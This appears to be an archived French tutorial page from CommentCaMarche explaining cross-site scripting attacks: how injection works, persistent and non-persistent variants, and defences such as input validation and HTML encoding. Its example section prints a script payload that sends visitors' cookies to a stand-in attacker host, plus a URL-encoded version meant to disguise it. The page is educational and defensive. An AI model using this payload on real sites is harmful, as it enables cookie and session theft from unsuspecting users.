@@ -1,0 +1,382 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+
+<head>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<META NAME="copyright" content="2005 by Jean-Fran�ois Pillou">
+<META NAME="ROBOTS" content="all">
+<META NAME="author" content="Jean-Fran�ois Pillou">
+<META NAME="subject" content="Comment �a marche? [Le Spoofing IP]">
+<META NAME="topic" content="Cross site scripting">
+<meta>Cross-site scripting, XSS, CSS, Attaque XSS, Attaque CSS</meta>
+<META NAME="title" content="Attaques - Cross-Site Scripting">
+<title>Attaques Cross-Site Scripting</title>
+<link rel="stylesheet" href="../ccm.css" type="text/css">
+
+
+<link rel="alternate" type="application/rss+xml" title="CCM: Actualit&eacute; informatique" href="http://www.commentcamarche.net/rss/actualite.php3">
+<link rel="alternate" type="application/rss+xml" title="CCM: Actualit&eacute;s du site CommentCaMarche.net" href="http://www.commentcamarche.net/rss/rss.php3">
+</head>
+
+<body>
+
+<table class="ccmmain">
+<tr>
+<td height="1" width="170"><img src="../images/pixel_transparent.gif" height="1" width="100%" alt=""></td>
+<td height="1" width="540"><img src="../images/pixel_transparent.gif" height="1" width="100%" alt=""></td>
+<td height="1" width="12"><img src="../images/pixel_transparent.gif" height="1" width="100%" alt=""></td>
+<td height="1" width="10"><img src="../images/pixel_transparent.gif" height="1" width="100%" alt=""></td>
+</tr>
+
+<tr>
+<td colspan="2" bgcolor="#AEBFE2" style="vertical-align:top;text-align:left;height:46;background-color:#AEBFE2;">
+<table border="0" cellspacing="0" cellpadding="0">
+    <tr>
+    <td style="vertical-align:top;"><a href="../index.htm" target="_top"><img src="../images/logotop.png" border="0" width="328" height="42" title="Comment Ca Marche - Communaut&eacute; informatique" alt="Comment Ca Marche - Communaut&eacute; informatique"></a></td>
+    <td style="width:30px">&nbsp;</td>
+    <td style="vertical-align:middle;text-align:left"></td></tr>
+</table>
+</td>
+<td style="background-color: #AEBFE2; vertical-align:bottom;">&nbsp;</td>
+<td style="background-color: #AEBFE2;">&nbsp;</td>
+</tr>
+
+<tr>
+<td bgcolor="#8EA6D6"><div id="ccmicons"><a href="../index.htm"  ><img src="../images/icohome2.gif" name="icohome" alt="Accueil - Encyclop&eacute;die informatique" title="Accueil - Encyclop&eacute;die informatique" width="24" border="0"></a><a href="http://www.commentcamarche.net/encyclopedie"  ><img src="../images/icozip2.gif" name="icozip" alt="T&eacute;l&eacute;charger l'encyclop&eacute;die" title="T&eacute;l&eacute;charger l'encyclop&eacute;die" width="24" border="0"></a><a href="http://www.commentcamarche.net/ccmbugs/?Bug_url=%2Fattaques%2Fcross-site-scripting.php3#ecrire"  ><img src="../images/icowri2.gif" name="icowri" alt="Contribuer &agrave; cet article" width="24" border="0"></a><a href="http://www.commentcamarche.net/contact/"  ><img src="../images/icomail2.gif" name="icomail" alt="" title="Ecrire &agrave; Jean-Francois Pillou" width="24"  border="0"></a></div></td>
+<td colspan="3" bgcolor="#8EA6D6"></td>
+</tr>
+
+<tr>
+<td height="1"><img src="../images/pixel_white.png" height="1" width="100%" alt=""></td>
+<td height="1"><img src="../images/pixel_white.png" height="1" width="100%" alt=""></td>
+<td height="1" rowspan="2"><img src="../images/pixel_white.png" height="1" width="12" alt=""></td>
+
+<td bgcolor="#FFFFFF" height="100%" valign="top" rowspan="2">
+</td>
+</tr>
+
+<tr><td valign="top" colspan="3"><div id="contenu"><h1> Attaques - Cross-Site Scripting</h1><table border="0" cellpadding="0" cellspacing="0" width="722">
+	<tr>
+		<td><img src="images/cross-site-scripting.png" alt="Vuln&eacute;rabilit&eacute;s cross-site scripting"></td>
+		<td valign="top" width="38"><a href="manipulation-url.htm"><img src="../images/bckward.gif" border="0" width="38" height="63" alt=""></a></td>
+		<td valign="top" width="38"><a href="injection-commandes-sql.htm"><img src="../images/forward.gif" border="0" width="38" height="63" alt=""></a></td>		<td valign="top" width="63"><a href="../index.htm"><img src="../images/logoPClw.gif" alt="Encyclop�die" height="60" width="63" border="0"></a></td>
+		</tr>
+</table>
+<br><div id="CCMmenu"><table width="156">
+<tr><th>Attaques / Arnaques</th></tr>
+<tr><td><a class="mlink" href="attaques.htm">Piratage</a></td></tr>
+<tr><th><span class="rouge">Pirates</span></th></tr>
+<tr><td><a class="mlink" href="typologie-pirates.htm">Typologie de pirates</a></td></tr>
+<tr><td><a class="mlink" href="methodologie.htm">M&eacute;thodologie</a></td></tr>
+<tr><td><a class="mlink" href="exploits.htm">Exploits</a></td></tr>
+<tr><th><span class="rouge">Attaques cryptographiques</span></th></tr>
+<tr><td><a class="mlink" href="passwd.htm">Mot de passe</a></td></tr>
+<tr><td><a class="mlink" href="man-in-the-middle.htm">Man in the middle</a></td></tr>
+<tr><td><a class="mlink" href="rejeu.htm">Rejeu</a></td></tr>
+<tr><th><span class="rouge">D&eacute;ni de service</span></th></tr>
+<tr><td><a class="mlink" href="dos.htm">D&eacute;ni de service</a></td></tr>
+<tr><td><a class="mlink" href="attaque-smurf.htm">Attaque par r&eacute;flexion</a></td></tr>
+<tr><td><a class="mlink" href="attaque-ping-de-la-mort.htm">Ping de la mort</a></td></tr>
+<tr><td><a class="mlink" href="attaque-teardrop.htm">Fragmentation</a></td></tr>
+<tr><td><a class="mlink" href="attaque-land.htm">Land</a></td></tr>
+<tr><td><a class="mlink" href="attaque-syn.htm">SYN</a></td></tr>
+<tr><th><span class="rouge">Techniques</span></th></tr>
+<tr><td><a class="mlink" href="usurpation-ip-spoofing.htm">Usurpation d'adresse IP</a> (<a class="mlink" href="usurpation-ip-spoofing.htm">spoofing</a>)</td></tr>
+<tr><td><a class="mlink" href="vol-session-hijacking.htm">Vol de session</a> (<a class="mlink" href="vol-session-hijacking.htm">hijacking</a>)</td></tr>
+<tr><td><a class="mlink" href="arp-poisoning.htm">ARP poisoning</a></td></tr>
+<tr><td><a class="mlink" href="sniffers.htm">Ecoute r&eacute;seau</a> (<a class="mlink" href="sniffers.htm">sniffers</a>)</td></tr>
+<tr><td><a class="mlink" href="balayage-ports.htm">Balayage de ports</a> (<a class="mlink" href="balayage-ports.htm">Port scanning</a>)</td></tr>
+<tr><td><a class="mlink" href="buffer-overflow.htm">D&eacute;bordement de tampon</a> (<a class="mlink" href="buffer-overflow.htm">Buffer overflow</a>)</td></tr>
+<tr><td><a class="mlink" href="spam.htm">Spam</a></td></tr>
+<tr><td><a class="mlink" href="mailbombing.htm">Mail-bombing</a></td></tr>
+<tr><th><span class="rouge">Vuln&eacute;rabilit&eacute;s du web</span></th></tr>
+<tr><td><a class="mlink" href="attaques-web.htm">Attaques web</a></td></tr>
+<tr><td><a class="mlink" href="falsification-donnees.htm">Falsification de la saisie</a></td></tr>
+<tr><td><a class="mlink" href="manipulation-url.htm">Manipulation d'URL</a></td></tr>
+<tr><td><a class="mlink" href="cross-site-scripting.htm">Cross-Site Scripting</a></td></tr>
+<tr><td><a class="mlink" href="injection-commandes-sql.htm">Injection SQL</a></td></tr>
+<tr><th><span class="rouge">Arnaques</span></th></tr>
+<tr><td><a class="mlink" href="ingenierie-sociale.htm">Ing&eacute;nierie sociale</a> (<a class="mlink" href="ingenierie-sociale.htm">social engineering</a>)</td></tr>
+<tr><td><a class="mlink" href="scam.htm">Scam</a></td></tr>
+<tr><td><a class="mlink" href="phishing.htm">Phishing</a></td></tr>
+<tr><td><a class="mlink" href="loteries.htm">Loteries</a></td></tr>
+<tr><th><span class="rouge">Plus d'information</span></th></tr>
+<tr><td><a class="mlink" href="../virus/virus.htm">Virus</a></td></tr>
+<tr><td><a class="mlink" href="../virus/trojan.htm">Cheval de Troie</a></td></tr>
+<tr><td><a class="mlink" href="../virus/spywares.htm">Spyware</a></td></tr>
+<tr><td><a class="mlink" href="../virus/hoax.htm">Hoax</a></td></tr>
+<tr><td><a class="mlink" href="http://www.commentcamarche.net/faq/12-securite">FAQ s&eacute;curit&eacute;</a></td></tr>
+<tr><td><a class="mlink" href="http://www.commentcamarche.net/faq/156-internet">FAQ Internet</a></td></tr>
+</table></div>
+<hr>
+
+<a name="injection" class="ancre"></a><h2>Injection de code malicieux</h2>
+
+<p align="justify">Les attaques de type <b>Cross-Site Scripting</b> (not&eacute;e parfois <i>XSS</i> ou <i>CSS</i>)
+sont des attaques visant les sites web affichant dynamiquement du contenu utilisateur
+sans effectuer de contr&ocirc;le et d'encodage des informations saisies
+par les utilisateurs.
+Les attaques Cross-Site Scripting consistent ainsi &agrave; forcer un site web &agrave; afficher du code
+HTML ou des scripts saisis par les utilisateurs. Le code ainsi inclus (le terme &laquo;&nbsp;inject&eacute;&nbsp;&raquo;
+est habituellement utilis&eacute;) dans un
+site web vuln&eacute;rable est dit &laquo;&nbsp;malicieux&nbsp;&raquo;.
+
+<p align="justify">Il est courant que les sites affichent des messages d'information reprenant
+directement un param&egrave;tre entr&eacute; par l'utilisateur. L'exemple le plus classique
+est celui des &laquo;&nbsp;pages d'erreur 404&nbsp;&raquo;. Certains sites web modifient
+le comportement du site web, afin d'afficher un message d'erreur personnalis&eacute;e lorsque
+la page demand&eacute;e par le visiteur n'existe pas. Parfois la page g&eacute;n&eacute;r&eacute;e
+dynamiquement affiche le nom de la page demand&eacute;e. Appelons <i>http://site.vulnerable</i> un
+site poss&eacute;dant  une telle faille. L'appel de l'URL <i>http://site.vulnerable/page-inexistante</i>
+correspondant &agrave; une page n'existant pas provoquera l'affichage d'un message d'erreur indiquant
+que la page &laquo;&nbsp;page-inexistante&nbsp;&raquo; n'existe pas. Il est ainsi possible de faire
+afficher ce que l'on souhaite au site web en rempla&ccedil;ant
+ &laquo;&nbsp;page-inexistante&nbsp;&raquo;  par toute autre cha&icirc;ne de caract&egrave;re.
+
+
+<p align="justify">Ainsi, si aucun contr&ocirc;le n'est effectu&eacute; sur le contenu fourni par l'utilisateur,
+il est possible d'afficher du code HTML arbitraire sur une page web, afin d'en changer
+l'aspect, le contenu ou bien le comportement.
+
+<p align="justify">De plus, la plupart des navigateurs sont dot&eacute;s de la capacit&eacute;
+d'interpr&ecirc;ter des scripts contenus dans les pages web, &eacute;crits dans diff&eacute;rents
+langages, tel que <a href="../javascript/jsintro.htm">JavaScript</a>, <a href="../vbscript/vbsintro.htm">VBScript</a>, <a href="../java/java.htm">Java</a>, ActiveX  ou Flash.
+Les balises HTML suivantes permettent ainsi d'incorporer des scripts ex&eacute;cutables dans
+une page web : &lt;SCRIPT&gt;, &lt;OBJECT&gt;, &lt;APPLET&gt;, and &lt;EMBED&gt;.
+
+<p align="justify">Il est ainsi possible &agrave; un pirate d'injecter  du code
+arbitraire dans la page web, afin que celui-ci soit ex&eacute;cut&eacute; sur le poste de l'utilisateur
+dans le contexte de s&eacute;curit&eacute; du site vuln&eacute;rable.  Pour ce faire,
+il lui suffit de remplacer la valeur du texte destin&eacute; &agrave; &ecirc;tre
+affich&eacute; par un script, afin que celui s'affiche dans la page web.
+Pour peu que le navigateur de l'utilisateur soit configur&eacute; pour ex&eacute;cuter
+de tels scripts, le code malicieux a acc&egrave;s &agrave; l'ensemble des donn&eacute;es
+partag&eacute;es par la page web de l'utilisateur et le serveur (cookies, champs de formulaires,
+etc.).
+
+<a name="xss" class="ancre"></a><h2>Cons&eacute;quences</h2>
+
+<p align="justify">Gr&acirc;ce aux vuln&eacute;rabilit&eacute;s Cross-Site Scripting,
+il est possible &agrave; un pirate de r&eacute;cup&eacute;rer par ce biais les donn&eacute;es
+&eacute;chang&eacute;es entre l'utilisateur et le site web concern&eacute;. Le code
+inject&eacute; dans la page web peut ainsi servir &agrave; afficher un formulaire
+afin de tromper l'utilisateur et lui faire saisir par exemple des informations d'authentification.
+
+<p align="justify">Par ailleurs, le script inject&eacute; peut permettre de rediriger l'utilisateur vers une page sous le contr&ocirc;le du pirate,
+poss&eacute;dant &eacute;ventuellement la m&ecirc;me interface graphique que le site compromis
+afin de tromper l'usager.
+
+<p align="justify">Dans un tel contexte, la relation de confiance existant entre l'utilisateur et le site
+web est compl&egrave;tement compromise.
+
+<a name="persistance" class="ancre"></a><h2>Persistance de l'attaque</h2>
+
+<p align="justify">Lorsque les donn&eacute;es saisies par l'utilisateur sont stock&eacute;es
+sur le serveur pendant un certain temps (cas d'un forum de discussion par exemple), l'attaque est dite &laquo;&nbsp;<b>persistante</b>&nbsp;&raquo;.
+En effet, tous les utilisateurs du site web acc&egrave;s &agrave; la page dans laquelle le
+code nuisible a &eacute;t&eacute; introduit.
+
+<p align="justify">Les attaques dites &laquo;&nbsp;<b>non persistantes</b>&nbsp;&raquo; concernent
+les pages web dynamiques dans lesquelles une variable entr&eacute;e par l'utilisateur est affich&eacute;e
+telle quelle (par exemple l'affichage du nom de l'utilisateur, de la page en cours ou du mot
+saisie dans un champ de formulaire).
+Pour pouvoir exploiter cette vuln&eacute;rabilit&eacute;, l'attaquant doit fournir &agrave; la victime
+une URL modifi&eacute;e, passant le code &agrave; ins&eacute;rer en param&egrave;tre. N&eacute;anmoins,
+une URL contenant des &eacute;l&eacute;ments de code Javascript pourra para&icirc;tre suspecte &agrave;
+la victime, c'est la raison pour laquelle cette attaque est la plupart r&eacute;alis&eacute;e en encodant
+les donn&eacute;es dans l'URL, afin qu'elle masque le code inject&eacute; &agrave; l'utilisateur.
+
+<a name="exemple" class="ancre"></a><h2>Exemple</h2>
+
+<p align="justify">Supposons que la page d'accueil de CommentCaMarche.net soit vuln&eacute;rable &agrave;
+une attaque de type Cross-Site Scripting car elle permet d'afficher sur la page d'accueil
+un message de bienvenue affichant le nom de l'utilisateur pass&eacute; en param&egrave;tre&nbsp;:
+
+<pre class="Code">http://www.commentcamarche.net/?nom=Jeff</pre>
+
+<p align="justify">Une personne malintentionn&eacute;e peut r&eacute;aliser une attaque
+Cross-Site Scripting non persistance en fournissant &agrave; une victime une adresse rempla&ccedil;ant
+le nom &laquo;&nbsp;Jeff&nbsp;&raquo; par du code HTML. Il peut notamment passer en
+param&egrave;tre le code Javascript suivant, servant &agrave; rediriger l'utilisateur vers
+une page dont il a la ma&icirc;trise&nbsp;:
+
+<pre class="Code">&lt;SCRIPT&gt;
+document.location='http://site.pirate/cgi-bin/script.cgi?'+document.cookie
+&lt;/SCRIPT&gt;</pre>
+
+<p align="justify">Le code ci-dessus r&eacute;cup&egrave;re les cookies de l'utilisateur
+et les transmet en param&egrave;tre &agrave; un script <a href="../cgi/cgiintro.htm">CGI</a>.
+Un tel code pass&eacute; en param&egrave;tre serait trop visible&nbsp;:
+
+<pre class="Code">http://www.commentcamarche.net/?nom=&lt;SCRIPT&gt;document.location
+='http://site.pirate/cgi-bin/script.cgi?'+document.cookie&lt;/SCRIPT&gt;</pre>
+
+<p align="justify">En revanche, l'encodage de l'URL permet de masquer l'attaque&nbsp;:
+
+<pre class="Code">http://www.commentcamarche.net/?nom=%3c%53%43%52%49%50%54%3e%64%6f%63%75%6d%65%
+6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%5c%27%68%74%74%70%3a%2f%2f%73%69%74%
+65%2e%70%69%72%61%74%65%2f%63%67%69%2d%62%69%6e%2f%73%63%72%69%70%74%2e%
+63%67%69%3f%5c%27%20%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%
+53%43%52%49%50%54%3e</pre>
+
+<a name="croisee" class="ancre"></a><h2>Attaque crois&eacute;e</h2>
+
+<p align="justify">Dans l'exemple pr&eacute;c&eacute;dent, l'ensemble du script est pass&eacute; en
+param&egrave;tre de l'URL. La m&eacute;thode GET, permettant de passer des param&egrave;tres
+dans l'URL est limit&eacute;e &agrave; une longueur totale de 255 caract&egrave;res pour l'URL.
+Gr&acirc;ce &agrave; l'attribut <i>SRC</i> de la balise &lt;SCRIPT&gt;, il est possible
+d'ex&eacute;cuter du code malicieux stock&eacute; dans un script sur un serveur distant !
+Dans la mesure o&ugrave; il est ainsi possible d'injecter du code &agrave; partir d'une
+source distante, ce type d'attaque porte le nom de &laquo;&nbsp;<i>Cross-Site</i>&nbsp;&raquo;
+(&laquo;&nbsp;Cross-Site&nbsp;&raquo; signifie litt&eacute;ralement &laquo;&nbsp;entre sites&nbsp;&raquo;).
+
+<a name="protection" class="ancre"></a><h2>Protection</h2>
+
+<p align="justify">Du c&ocirc;t&eacute; de l'utilisateur, il est possible de se
+pr&eacute;munir contre les attaques CSS en configurant le navigateur de mani&egrave;re
+&agrave; emp&ecirc;cher l'ex&eacute;cution des langages de scripts. Dans la r&eacute;alit&eacute;
+cette solution est souvent trop contraignante pour l'utilisateur car de nombreux
+sites refuseront de fonctionner correctement en l'absence de possibilit&eacute;
+d'ex&eacute;cution de code dynamique.
+
+<p align="justify">La seule fa&ccedil;on viable d'emp&ecirc;cher les attaques Cross-Site Scripting
+conssite &agrave; concevoir des sites web non vuln&eacute;rables. Pour ce faire, le
+concepteur d'un site web doit&nbsp;:
+<ul>
+<li>V&eacute;rifier le format des donn&eacute;es entr&eacute;es par les utilisateurs&nbsp;;
+<li>Encoder les donn&eacute;es utilisateurs affich&eacute;es en rempla&ccedil;ant les caract&egrave;res
+sp&eacute;ciaux par leurs <a href="../html/htmlcaracteres.htm">&eacute;quivalents HTML</a>.
+</ul>
+
+Le terme &laquo;&nbsp;sanitarisation&nbsp;&raquo; (en anglais &laquo;&nbsp;sanitation&nbsp;&raquo;)
+d&eacute;signe toutes les actions permettant de rendre s&ucirc;r une donn&eacute;e saisie
+par un utilisateur.
+
+<a name="plus" class="ancre"></a><h2>Plus d'information</h2>
+
+<p align="justify">
+<ul>
+<li><a href="http://www.cert.org/advisories/CA-2000-02.html" target="_blank">CERT� Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests</a></li>
+<li><a href="http://www.cert.org/tech_tips/malicious_code_mitigation.html" target="_blank">CERT� - Understanding Malicious Content Mitigation for Web Developers</a></li>
+</ul>
+
+<h2 id="sujets_sim">Trucs & astuces pertinents trouv&eacute;s dans la base de connaissances</h2><table class="simili"><tr class="sb">
+<td style="width:75px"><span class="">17/02&nbsp;18h26</span></td><td valign="middle"><a href="http://www.commentcamarche.net/faq/sujet-1073-creer-un-site-beau-dynamique-et-respectueux-des-standards"><img src="../images/carre.gif" border="0" alt=""></a>&nbsp;<a href="http://www.commentcamarche.net/faq/sujet-1073-creer-un-site-beau-dynamique-et-respectueux-des-standards">Cr�er un site beau, dynamique et respectueux des standards</a> (<a href="http://www.commentcamarche.net/faq/9-webmaster">Webmaster</a>)</td>
+
+</tr>
+<tr class="sa">
+<td style="width:75px"><span class="Date">17/02&nbsp;08h44</span></td><td valign="middle"><a href="http://www.commentcamarche.net/faq/sujet-3004-webmaster-voir-a-quoi-ressemble-votre-site-ailleurs"><img src="../images/carre.gif" border="0" alt=""></a>&nbsp;<a href="http://www.commentcamarche.net/faq/sujet-3004-webmaster-voir-a-quoi-ressemble-votre-site-ailleurs">Voir � quoi ressemble votre site ailleurs</a> (<a href="http://www.commentcamarche.net/faq/9-webmaster">Webmaster</a>)</td>
+
+</tr>
+<tr class="sb">
+<td style="width:75px"><span class="Date">16/02&nbsp;03h11</span></td><td valign="middle"><a href="http://www.commentcamarche.net/faq/sujet-63-creer-un-site-internet"><img src="../images/carre.gif" border="0" alt=""></a>&nbsp;<a href="http://www.commentcamarche.net/faq/sujet-63-creer-un-site-internet">Cr�er un site internet</a> (<a href="http://www.commentcamarche.net/faq/301-creation-de-pages">Cr�ation de pages</a>)</td>
+
+</tr>
+<tr class="sa">
+<td style="width:75px"><span class="Date">10/02&nbsp;19h12</span></td><td valign="middle"><a href="http://www.commentcamarche.net/faq/sujet-2459-les-images-ne-s-affichent-pas-sur-le-site"><img src="../images/carre.gif" border="0" alt=""></a>&nbsp;<a href="http://www.commentcamarche.net/faq/sujet-2459-les-images-ne-s-affichent-pas-sur-le-site">Les images ne s'affichent pas sur le site</a> (<a href="http://www.commentcamarche.net/faq/301-creation-de-pages">Cr�ation de pages</a>)</td>
+
+</tr>
+<tr class="sb">
+<td style="width:75px"><span class="Date">23/01&nbsp;15h45</span></td><td valign="middle"><a href="http://www.commentcamarche.net/faq/sujet-2658-aspirateur-de-pages-html-comment-aspirer-un-site-web"><img src="../images/carre.gif" border="0" alt=""></a>&nbsp;<a href="http://www.commentcamarche.net/faq/sujet-2658-aspirateur-de-pages-html-comment-aspirer-un-site-web">Comment aspirer un site Web ?</a> (<a href="http://www.commentcamarche.net/faq/350-web">Web</a>)</td>
+
+</tr>
+<tr class="sa">
+<td style="width:75px"><span class="Date">15/01&nbsp;22h54</span></td><td valign="middle"><a href="http://www.commentcamarche.net/faq/sujet-332-favicon-l-icone-de-votre-site-dans-la-barre-d-adresse"><img src="../images/carre.gif" border="0" alt=""></a>&nbsp;<a href="http://www.commentcamarche.net/faq/sujet-332-favicon-l-icone-de-votre-site-dans-la-barre-d-adresse">L'ic�ne de votre site dans la barre d'adresse</a> (<a href="http://www.commentcamarche.net/faq/9-webmaster">Webmaster</a>)</td>
+
+</tr>
+<tr class="sb">
+<td style="width:75px"><span class="Date">06/01&nbsp;00h53</span></td><td valign="middle"><a href="http://www.commentcamarche.net/faq/sujet-4840-navigateurs-acceder-rapidement-a-une-page-ou-un-site"><img src="../images/carre.gif" border="0" alt=""></a>&nbsp;<a href="http://www.commentcamarche.net/faq/sujet-4840-navigateurs-acceder-rapidement-a-une-page-ou-un-site">Acc�der rapidement � une page ou un site</a> (<a href="http://www.commentcamarche.net/faq/156-internet">Internet</a>)</td>
+
+</tr>
+<tr class="sa">
+<td style="width:75px"><span class="Date">22/12&nbsp;22h09</span></td><td valign="middle"><a href="http://www.commentcamarche.net/faq/sujet-3049-webmaster-publier-facilement-une-video-dans-une-page-web"><img src="../images/carre.gif" border="0" alt=""></a>&nbsp;<a href="http://www.commentcamarche.net/faq/sujet-3049-webmaster-publier-facilement-une-video-dans-une-page-web">Publier facilement une vid�o dans une page web</a> (<a href="http://www.commentcamarche.net/faq/9-webmaster">Webmaster</a>)</td>
+
+</tr>
+<tr class="sb">
+<td style="width:75px"><span class="Date">29/11&nbsp;22h08</span></td><td valign="middle"><a href="http://www.commentcamarche.net/faq/sujet-4516-webmaster-un-formulaire-de-contact-pour-votre-site"><img src="../images/carre.gif" border="0" alt=""></a>&nbsp;<a href="http://www.commentcamarche.net/faq/sujet-4516-webmaster-un-formulaire-de-contact-pour-votre-site">Un formulaire de contact pour votre site</a> (<a href="http://www.commentcamarche.net/faq/9-webmaster">Webmaster</a>)</td>
+
+</tr>
+<tr class="sa">
+<td style="width:75px"><span class="Date">22/11&nbsp;13h03</span></td><td valign="middle"><a href="http://www.commentcamarche.net/faq/sujet-3134-mythes-on-peut-proteger-une-page-web-une-image-contre-la-copie"><img src="../images/carre.gif" border="0" alt=""></a>&nbsp;<a href="http://www.commentcamarche.net/faq/sujet-3134-mythes-on-peut-proteger-une-page-web-une-image-contre-la-copie">On peut prot�ger une page web/une image contre la copie</a> (<a href="http://www.commentcamarche.net/faq/434-mythes-et-legendes">Mythes et l�gendes</a>)</td>
+
+</tr>
+<tr class="sa"><td colspan="3" style="text-align:right"><img src="../images/plus.png" alt="Cross site scripting" border="0"> Plus d'astuces sur &laquo;&nbsp;<a href="../astuces/cross-site-scripting"><b>Cross site scripting</b></a>&nbsp;&raquo;</td></tr></table><h2 id="discus_sim">Discussions pertinentes trouv&eacute;es dans le forum</h2><table class="simili"><tr class="sb">
+<td><span class="Dategris">30/11&nbsp;17h14</span></td>
+<td style="vertical-align:middle"><a href="http://www.commentcamarche.net/forum/affich-506011-installshield-scripting-runtime#2005-12-22%2021%3A24%3A38"><img src="../images/carre.gif" border="0" alt="installshield scripting runtime"></a><a href="http://www.commentcamarche.net/forum/affich-506011-installshield-scripting-runtime">&nbsp;InstallShield Scripting Runtime ???</a></td>
+<td><a href="http://www.commentcamarche.net/forum/forum-1-logiciels-pilotes">Logiciels/Pilotes</a></td>
+<td><span class="Date">22/12&nbsp;21h24</span><span class="Date">-&gt;</span><a class="mlink2" href="http://www.commentcamarche.net/forum/affich-506011-installshield-scripting-runtime#2005-12-22%2021%3A24%3A38">ARNIX2</a></td><td style="text-align:center"><span class="Texte">27</span></td>
+</tr>
+<tr class="sa">
+<td><span class="Dategris">05/01&nbsp;23h10</span></td>
+<td style="vertical-align:middle"><a href="http://www.commentcamarche.net/forum/affich-565320-erreur-1607-installshield-scripting-runtime#2006-12-29%2016%3A48%3A31"><img src="../images/carre.gif" border="0" alt="1607 installshield scripting runtime"></a><a href="http://www.commentcamarche.net/forum/affich-565320-erreur-1607-installshield-scripting-runtime">&nbsp;erreur 1607 InstallShield Scripting RunTime</a></td>
+<td><a href="http://www.commentcamarche.net/forum/forum-11-windows">Windows</a></td>
+<td><span class="Date">29/12&nbsp;16h48</span><span class="Date">-&gt;</span><a class="Date" href="http://www.commentcamarche.net/forum/affich-565320-erreur-1607-installshield-scripting-runtime#2006-12-29%2016%3A48%3A31">vincent</a></td><td style="text-align:center"><span class="Texte">24</span></td>
+</tr>
+<tr class="sb">
+<td><span class="Dategris">07/04&nbsp;16h41</span></td>
+<td style="vertical-align:middle"><a href="http://www.commentcamarche.net/forum/affich-1424294-linux-shell-scripting-commande-cat-ou-sed#2005-04-08%2013%3A50%3A22"><img src="../images/carre.gif" border="0" alt="linux shell scripting commande cat sed"></a><a href="http://www.commentcamarche.net/forum/affich-1424294-linux-shell-scripting-commande-cat-ou-sed">&nbsp;[Linux-Shell-scripting] commande cat ou sed ?</a></td>
+<td><a href="http://www.commentcamarche.net/forum/forum-13-linux-unix">Linux/Unix</a></td>
+<td><span class="Date">08/04&nbsp;13h50</span><span class="Date">-&gt;</span><a class="mlink2" href="http://www.commentcamarche.net/forum/affich-1424294-linux-shell-scripting-commande-cat-ou-sed#2005-04-08%2013%3A50%3A22">np34</a></td><td style="text-align:center"><span class="Texte">8</span></td>
+</tr>
+<tr class="sa">
+<td><span class="Dategris">17/01&nbsp;13h17</span></td>
+<td style="vertical-align:middle"><a href="http://www.commentcamarche.net/forum/affich-592443-1607-unable-to-installshield-scripting-runtim#2005-12-22%2022%3A06%3A31"><img src="../images/carre.gif" border="0" alt="1607 unable to installshield scripting runtim"></a><a href="http://www.commentcamarche.net/forum/affich-592443-1607-unable-to-installshield-scripting-runtim">&nbsp;1607 unable to installShield scripting runtim</a></td>
+<td><a href="http://www.commentcamarche.net/forum/forum-1-logiciels-pilotes">Logiciels/Pilotes</a></td>
+<td><span class="Date">22/12&nbsp;22h06</span><span class="Date">-&gt;</span><a class="mlink2" href="http://www.commentcamarche.net/forum/affich-592443-1607-unable-to-installshield-scripting-runtim#2005-12-22%2022%3A06%3A31">ARNIX2</a></td><td style="text-align:center"><span class="Texte">6</span></td>
+</tr>
+<tr class="sb">
+<td><span class="Dategris">30/11&nbsp;17h09</span></td>
+<td style="vertical-align:middle"><a href="http://www.commentcamarche.net/forum/affich-506004-installshield-scripting-runtime#2003-12-03%2001%3A25%3A29"><img src="../images/carre.gif" border="0" alt="installshield scripting runtime"></a><a href="http://www.commentcamarche.net/forum/affich-506004-installshield-scripting-runtime">&nbsp;InstallShield Scripting Runtime ???</a></td>
+<td><a href="http://www.commentcamarche.net/forum/forum-11-windows">Windows</a></td>
+<td><span class="Date">03/12&nbsp;01h25</span><span class="Date">-&gt;</span><a class="mlink2" href="http://www.commentcamarche.net/forum/affich-506004-installshield-scripting-runtime#2003-12-03%2001%3A25%3A29">peps</a></td><td style="text-align:center"><span class="Texte">3</span></td>
+</tr>
+<tr class="sa">
+<td><span class="Dategris">25/04&nbsp;11h40</span></td>
+<td style="vertical-align:middle"><a href="http://www.commentcamarche.net/forum/affich-1469115-c-inclure-du-shelle-scripting-dans-c#2005-04-25%2012%3A44%3A02"><img src="../images/carre.gif" border="0" alt="inclure shelle scripting"></a><a href="http://www.commentcamarche.net/forum/affich-1469115-c-inclure-du-shelle-scripting-dans-c">&nbsp;[C++] Inclure du shelle scripting dans C++</a></td>
+<td><a href="http://www.commentcamarche.net/forum/forum-3-developpement">D&eacute;veloppement</a></td>
+<td><span class="Date">25/04&nbsp;12h44</span><span class="Date">-&gt;</span><a class="Date" href="http://www.commentcamarche.net/forum/affich-1469115-c-inclure-du-shelle-scripting-dans-c#2005-04-25%2012%3A44%3A02">Hitchy</a></td><td style="text-align:center"><span class="Texte">2</span></td>
+</tr>
+<tr class="sb">
+<td><span class="Dategris">22/08&nbsp;16h41</span></td>
+<td style="vertical-align:middle"><a href="http://www.commentcamarche.net/forum/affich-1749604-html-scripting-onchange-lien-dans-iframe#2005-08-22%2017%3A03%3A42"><img src="../images/carre.gif" border="0" alt="html scripting onchange lien iframe"></a><a href="http://www.commentcamarche.net/forum/affich-1749604-html-scripting-onchange-lien-dans-iframe">&nbsp;[HTML, Scripting] OnChange + lien dans iframe</a></td>
+<td><a href="http://www.commentcamarche.net/forum/forum-24-webmastering">Webmastering</a></td>
+<td><span class="Date">22/08&nbsp;17h03</span><span class="Date">-&gt;</span><a class="Date" href="http://www.commentcamarche.net/forum/affich-1749604-html-scripting-onchange-lien-dans-iframe#2005-08-22%2017%3A03%3A42">Bios</a></td><td style="text-align:center"><span class="Texte">2</span></td>
+</tr>
+<tr class="sa">
+<td><span class="Dategris">09/07&nbsp;10h33</span></td>
+<td style="vertical-align:middle"><a href="http://www.commentcamarche.net/forum/affich-118962-server-createobject-scripting-filesystemobje#2002-07-09%2015%3A12%3A06"><img src="../images/carre.gif" border="0" alt="server. scripting.filesystemobje"></a><a href="http://www.commentcamarche.net/forum/affich-118962-server-createobject-scripting-filesystemobje">&nbsp;Server.CreateObject(&quot;Scripting.FileSystemObje</a></td>
+<td><a href="http://www.commentcamarche.net/forum/forum-3-developpement">D&eacute;veloppement</a></td>
